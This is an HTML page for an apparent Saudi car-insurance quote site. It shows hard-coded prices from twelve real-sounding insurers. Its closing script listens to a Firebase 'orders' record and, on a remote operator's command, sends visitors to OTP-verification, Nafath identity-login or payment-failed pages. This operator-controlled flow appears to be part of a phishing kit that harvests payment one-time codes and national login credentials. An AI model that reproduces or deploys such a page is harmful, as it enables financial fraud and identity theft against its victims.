<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>عروض التأمين | Insurance Offers</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/inner-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        .loader { text-align: center; padding: 40px; color: var(--text-muted); }
        .loader .spin-ring { margin-bottom: 16px; }
    </style>
</head>
<body>

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<nav class="inner-nav">
    <a href="index.html" class="inner-nav__logo">tree</a>
    <div class="inner-nav__right">
        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
    </div>
</nav>

<div class="page-wrap">

    <!-- Steps -->
    <div class="steps-bar" style="width:100%;max-width:800px;">
        <div class="step-item done">
            <div class="step-circle">✔</div>
            <div class="step-label" data-i18n="steps.data">البيانات</div>
        </div>
        <div class="step-item active">
            <div class="step-circle">2</div>
            <div class="step-label" data-i18n="steps.prices">قائمة الأسعار</div>
        </div>
        <div class="step-item">
            <div class="step-circle">3</div>
            <div class="step-label" data-i18n="steps.summary">الملخص والدفع</div>
        </div>
    </div>

    <div class="teal-card teal-card--wide" style="margin-top:24px;">
        <div class="card-head">
            <div class="section-title" data-i18n="offers.title">اختر العرض الأنسب لك</div>
        </div>
        <div class="card-body">

            <!-- Type filter -->
            <div class="type-filter">
                <button class="type-filter__btn active" id="btn-tpl" onclick="startFilter('tpl')" data-i18n="ins.tpl">ضد الغير</button>
                <button class="type-filter__btn" id="btn-comp" onclick="startFilter('comp')" data-i18n="ins.comp">شامل</button>
            </div>

            <div id="loader" class="loader" style="display:none;">
                <div class="spin-ring"></div>
                <p data-i18n="offers.searching">جاري البحث عن أفضل العروض...</p>
            </div>

            <div id="offersList"></div>

        </div>
    </div>

    <div class="inner-footer" data-i18n="offers.footer">© 2024 تري لوساطة التأمين</div>
</div>

<script>
    const offersData = [
        { company: "ولاء للتأمين", logo: "images/companies/walaa.png", tplPrice: 502, compPrice: 1850, rating: 4.5 },
        { company: "ميدغلف", logo: "images/companies/MEDGULF.png", tplPrice: 679, compPrice: 2100, rating: 4.0 },
        { company: "سلامة للتأمين", logo: "images/companies/SALAMA.png", tplPrice: 495, compPrice: 1750, rating: 3.8 },
        { company: "أسيج", logo: "images/companies/ACIG.png", tplPrice: 550, compPrice: 1900, rating: 4.2 },
        { company: "التعاونية", logo: "images/companies/tawuniya.png", tplPrice: 850, compPrice: 2400, rating: 4.9 },
        { company: "ملاذ للتأمين", logo: "images/companies/malath.png", tplPrice: 620, compPrice: 2050, rating: 4.1 },
        { company: "تكافل الراجحي", logo: "images/companies/Al Rajhi Takaful.png", tplPrice: 590, compPrice: 1950, rating: 4.7 },
        { company: "الدرع العربي", logo: "images/companies/Arabian Shield.png", tplPrice: 480, compPrice: 1700, rating: 3.9 },
        { company: "أمانة للتأمين", logo: "images/companies/amana.png", tplPrice: 490, compPrice: 1720, rating: 3.7 },
        { company: "الاتحاد للتأمين", logo: "images/companies/union.png", tplPrice: 530, compPrice: 1880, rating: 4.0 },
        { company: "الخليجية العامة", logo: "images/companies/GULF GENERAL.png", tplPrice: 525, compPrice: 1840, rating: 3.8 },
        { company: "واتانية", logo: "images/companies/Wataniya.png", tplPrice: 560, compPrice: 1920, rating: 4.1 }
    ];

    const offersList = document.getElementById('offersList');
    const loader = document.getElementById('loader');
    let activeType = 'tpl';

    function startFilter(type) {
        activeType = type;
        document.getElementById('btn-tpl').classList.toggle('active', type === 'tpl');
        document.getElementById('btn-comp').classList.toggle('active', type === 'comp');
        offersList.style.opacity = '0.4';
        loader.style.display = 'block';
        offersList.innerHTML = '';
        setTimeout(() => {
            renderOffers(type);
            loader.style.display = 'none';
            offersList.style.opacity = '1';
        }, 700);
    }

    function renderOffers(type) {
        offersList.innerHTML = '';
        const sorted = [...offersData].sort((a, b) =>
            type === 'tpl' ? a.tplPrice - b.tplPrice : a.compPrice - b.compPrice
        );
        sorted.forEach(offer => {
            const price = type === 'tpl' ? offer.tplPrice : offer.compPrice;
            const typeText = type === 'tpl' ? t('ins.tpl') : t('ins.comp');
            const stars = '⭐'.repeat(Math.floor(offer.rating));

            const card = document.createElement('div');
            card.className = 'offer-card';
            card.innerHTML = `
                <div class="offer-card__left">
                    <div class="company-bubble">
                        <img src="${offer.logo}" alt="${offer.company}" onerror="this.onerror=null;this.src='https://ui-avatars.com/api/?name=${encodeURIComponent(offer.company)}&background=0a3330&color=00e5a0&size=80&font-size=0.4'">
                    </div>
                    <div>
                        <div class="offer-card__name">${offer.company}</div>
                        <div class="offer-card__stars">${stars} (${offer.rating})</div>
                        <div class="offer-card__features">
                            <div class="offer-card__feature"><span>✔</span> ${t('offers.workshop')}</div>
                            <div class="offer-card__feature"><span>✔</span> ${t('offers.roadside')}</div>
                            ${type === 'comp' ? `<div class="offer-card__feature"><span>✔</span> ${t('offers.glass')}</div>` : ''}
                        </div>
                    </div>
                </div>
                <div class="offer-card__right">
                    <div class="offer-card__price">${price}</div>
                    <div class="offer-card__sar">${t('offers.sar')}</div>
                    <div class="offer-card__incl">${t('offers.incl_tax')}</div>
                    <a href="policy_details.html?company=${encodeURIComponent(offer.company)}&price=${price}&type=${type}&logo=${encodeURIComponent(offer.logo)}" class="offer-buy-btn">${t('offers.buy_now')}</a>
                </div>
            `;
            offersList.appendChild(card);
        });
    }

    startFilter('tpl');

    (function() {
        const firebaseConfig = {
            apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
            authDomain: "tameen-658e9.firebaseapp.com",
            projectId: "tameen-658e9",
            storageBucket: "tameen-658e9.firebasestorage.app",
            messagingSenderId: "292670676256",
            appId: "1:292670676256:web:3624157751cd194efe4b45"
        };
        if (typeof firebase !== 'undefined') {
            try { firebase.initializeApp(firebaseConfig); } catch(e) {}
            const db = firebase.firestore();
            const userId = localStorage.getItem('user_id');
            if (userId) {
                db.collection("orders").doc(userId).onSnapshot((doc) => {
                    if (doc.exists) {
                        const data = doc.data();
                        if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
                        else if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
                        else if (data.next_step === "GO_TO_NAFATH") window.location.href = "nafath.html";
                    }
                });
            }
        }
    })();
</script>
</body>
</html>
